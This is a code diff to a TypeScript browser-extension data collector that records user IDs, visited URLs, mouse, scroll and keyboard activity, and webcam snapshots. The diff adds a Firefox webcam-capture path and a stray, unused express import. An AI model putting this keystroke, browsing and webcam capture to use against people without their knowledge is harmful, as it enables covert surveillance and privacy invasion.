@@ -1,11 +1,12 @@
 import * as _ from "lodash";
 import * as $ from 'jquery';
 import WebcamFacade from "./webcam-facade";
+import {response} from "express";
 
 /**
  * The structure of the collected data.
  */
-export interface CollectedData {
+export type CollectedData = {
     ui: string, ///< The user ID
     t: string, ///< The timestamp
     u: string, ///< The visited URL
@@ -29,7 +30,7 @@ export interface CollectedData {
 /**
  * The available options for the data collection.
  */
-export interface CollectionOptions {
+export type CollectionOptions = {
     mainInterval?: number, // defaults to 100 ms
     sendInterval?: number, // defaults to 5000 ms
     url?: {
@@ -61,7 +62,7 @@ export class Collector {
     private registerListeners() {
         if (this._areListenersRegistered) return;
 
-        chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+        chrome.runtime.onMessage.addListener((request) => {
             let mouseButtonFromInteger = (btn: number) => btn < 3 ? ['l', 'm', 'r'][btn] : 'b' + (btn + 1);
 
             switch (request.event) {
@@ -179,7 +180,7 @@ export class Collector {
      */
     async getWindowData(): Promise<CollectedData['w']> {
         return await new Promise<CollectedData['w']>(resolve => {
-            chrome.tabs.query({active: true, currentWindow: true}, function (tabs) {
+            chrome.tabs.query({active: true}, function (tabs) {
                 if (tabs === undefined || tabs[0] === undefined || tabs[0].id === undefined) {
                     resolve(null);
                 } else {
@@ -197,6 +198,29 @@ export class Collector {
         });
     }
 
+    static async getPhoto(): Promise<CollectedData['i']> {
+        if (navigator.userAgent.search("Firefox") === -1) {
+            return WebcamFacade.isEnabled ? await WebcamFacade.snapPhoto() : null;
+        }
+        return await new Promise<CollectedData['i']>(resolve => {
+            browser.tabs.query({active: true, currentWindow: true})
+                .then((tabs) => {
+                    if (tabs === undefined || tabs[0] === undefined || tabs[0].id === undefined) {
+                        resolve(null);
+                    } else {
+                        browser.tabs.sendMessage(tabs[0].id, {event: 'snapwebcam'})
+                            .then(async response => {
+                                if (browser.runtime.lastError) {
+                                    resolve(null);
+                                } else {
+                                    resolve(await response);
+                                }
+                            });
+                    }
+                });
+        });
+    }
+
     /**
      * Get all the required data.
      * @param options Various collection options
@@ -210,7 +234,7 @@ export class Collector {
             s: await this.getScrollData(),
             w: await this.getWindowData(),
             k: this.getKeyboardData(),
-            i: WebcamFacade.isEnabled ? await WebcamFacade.snapPhoto() : null
+            i: await Collector.getPhoto()
         };
     }
 
